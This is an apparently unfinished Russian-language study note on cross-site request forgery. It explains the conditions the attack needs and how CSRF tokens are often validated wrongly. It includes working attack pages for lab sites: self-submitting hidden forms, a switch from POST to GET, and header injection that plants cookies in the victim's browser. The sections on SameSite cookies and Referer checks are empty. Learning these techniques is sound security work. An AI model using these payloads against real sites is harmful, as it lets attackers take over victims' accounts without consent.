# Как работает CSRF?
Чтобы CSRF стала возможной, необходимо наличие трех ключевых условий:
- Соответствующее действие. В приложении есть действие, которое злоумышленник имеет основания вызвать. Это может быть привилегированное действие (например, изменение разрешений для других пользователей) или любое действие над данными конкретного пользователя (например, изменение собственного пароля).
- Обработка сеанса на основе куки. Выполнение действия подразумевает выдачу одного или нескольких HTTP-запросов, и приложение полагается исключительно на куки сеанса для идентификации пользователя, выполнившего эти запросы. Нет никаких других механизмов для отслеживания сеансов или проверки запросов пользователя.
- Отсутствие непредсказуемых параметров запроса. Запросы, выполняющие действие, не содержат параметров, значения которых злоумышленник не может определить или угадать. Например, заставляя пользователя сменить пароль, функция не уязвима, если злоумышленнику необходимо знать значение существующего пароля.

Примечание:
>Хотя CSRF обычно описывается в связи с обработкой сеанса на основе cookie, он также возникает в других контекстах, когда приложение автоматически добавляет некоторые учетные данные пользователя к запросам, например, при аутентификации HTTP Basic и аутентификации на основе сертификатов.

Например, приложение содержит функцию, позволяющую пользователю изменить адрес электронной почты в своей учетной записи:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
  
Можно создать страницу, содержащую следующий HTML:

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script> document.forms[0].submit(); </script>
    </body>
</html>
```

Если пользователь созданную страницу, произойдет следующее:
- Страница вызовет HTTP-запрос на уязвимый веб-сайт.
- Если пользователь вошел на уязвимый сайт, его браузер автоматически включит в запрос сессионный файл cookie (при условии, что не используются SameSite cookie).
- Уязвимый веб-сайт обработает запрос обычным образом, расценит его как сделанный пользователем-жертвой и изменит его адрес электронной почты.

# Общие меры защиты от CSRF
## CSRF токены
CSRF-токен - это уникальное, секретное и непредсказуемое значение, которое генерируется приложением на стороне сервера и передается клиенту. При отправке запроса на выполнение сенситив действия, такого как отправка формы, клиент должен указать правильный маркер CSRF. В противном случае сервер откажется выполнять запрошенное действие.

Распространенным способом передачи CSRF-токенов клиенту является включение их в качестве скрытого параметра в HTML-форму, например:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="example@normal-website.com">
	<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
	<button class='button' type='submit'> Update email </button>
</form>
```

Отправка этой формы приводит к следующему запросу:

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

### Общие недостатки при валидации CSRF токенов
#### Валидация CSRF-токена зависит от метода запроса
Некоторые приложения правильно проверяют маркер, когда запрос использует метод POST, но пропускают проверку, когда используется метод GET. В этой ситуации можно переключиться на метод GET, чтобы обойти валидацию:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

Пример подмененной страницы:

```html
<html>
    <body>
        <form action="https://0a4700eb04672d42c0ba5e1f000f0048.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script> document.forms[0].submit(); </script>
    </body>
</html>
```

#### Проверка CSRF токена зависит от наличия токена
Некоторые приложения правильно проверяют маркер, если он присутствует, но пропускают проверку, если маркер пропущен. В этой ситуации можно удалить весь параметр, содержащий токен (а не только его значение), чтобы обойти проверку:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

#### CSRF-токен не привязан к сессии пользователя
Некоторые приложения не проверяют принадлежность токена к той же сессии, что и пользователь, делающий запрос. Вместо этого приложение ведет глобальный пул выданных им токенов и принимает любой токен, который появляется в этом пуле.

В такой ситуации можно войти в приложение, используя свою учетную запись, получить действительный токен, а затем передать его пользователю-мамонтенку:
```html
<html>
    <body>
        <form action="https://0a68003f046d5cf3c0bc181f008500aa.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="<tuta_our_csrf_token>">
        </form>
        <script> document.forms[0].submit(); </script>
    </body>
</html>
```

#### CSRF-токен привязан к non-session cookie
В вариации на тему предыдущей уязвимости, некоторые приложения привязывают CSRF-токен к cookie, но не к той же самой cookie, которая используется для отслеживания сессий. Это может легко произойти, если в приложении используются два разных фреймворка, один для обработки сеансов, а другой для защиты от CSRF, которые не интегрированы друг с другом:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68 Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

В такой ситуации сложнее реализовать CSRF, но все равно возможно. Если веб-сайт содержит поведение, позволяющее установить cookie в браузере жертвы, то атака возможна. Можем войти в приложение, используя свою учетную запись, получить действительный токен и связанный с ним cookie, использовать поведение установки cookie, чтобы поместить свой cookie в браузер жертвы, и передать свой токен жертве в CSRF-атаке (тут основная сложность в передаче "своего" куки):

```html
<html>
    <body>
        <form action="https://0a1c003803ae7203c07568d400e800c1.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="kekekekekekekkeke@evil-user.net" />
            <input type="hidden" name="csrf" value="ue6EN7rNEs6O91v7jzC2y7eS2ymf7n0C">
        </form>
        <img src="https://0a1c003803ae7203c07568d400e800c1.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=svHB6OaqfPn7oo1LX4A8Y62sXdjuKphD%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

Примечание:

>Поведение при установке cookie даже не обязательно должно существовать в том же веб-приложении, что и уязвимость CSRF. Любое другое приложение в том же общем DNS-домене потенциально может быть использовано для установки cookie в приложении, которое является объектом атаки, если управляемый cookie имеет подходящую область действия. Например, функция установки cookie на `staging.demo.normal-website.com` может быть использована для размещения cookie, который отправляется на `secure.normal-website.com`.

#### CSRF-токен просто дублируется в cookie
Еще одна вариация предыдущей уязвимости: некоторые приложения не хранят на стороне сервера записи о выданных токенах, а дублируют каждый токен в cookie и параметре запроса. Когда последующий запрос проверяется, приложение просто проверяет, что токен, представленный в параметре запроса, соответствует значению, представленному в cookie. Такой способ защиты от CSRF иногда называют "двойной отправкой", и его поддерживают, поскольку он прост в реализации и позволяет избежать необходимости в создании записей на стороне сервера:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

В этой ситуации снова можно провести CSRF-атаку, если на сайте есть функция установки cookie. Здесь не нужно получать собственный действительный токен. Просто создаем токен (возможно, в требуемом формате, если это проверяется), используем поведение установки cookie, чтобы поместить свой cookie в браузер жертвы, и передаем свой токен жертве:

```html
<html>
    <body>
        <form action="https://0af900360319df31c03effc6008e0010.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="kekekekekekekkeke@evil-user.net" />
            <input type="hidden" name="csrf" value="b1b2RP8d9hpPUQHTlJYo1uiMrf4O7l14">
        </form>
        <img src="https://0af900360319df31c03effc6008e0010.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=b1b2RP8d9hpPUQHTlJYo1uiMrf4O7l14%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

## SameSite cookie


## Referer-based валидация

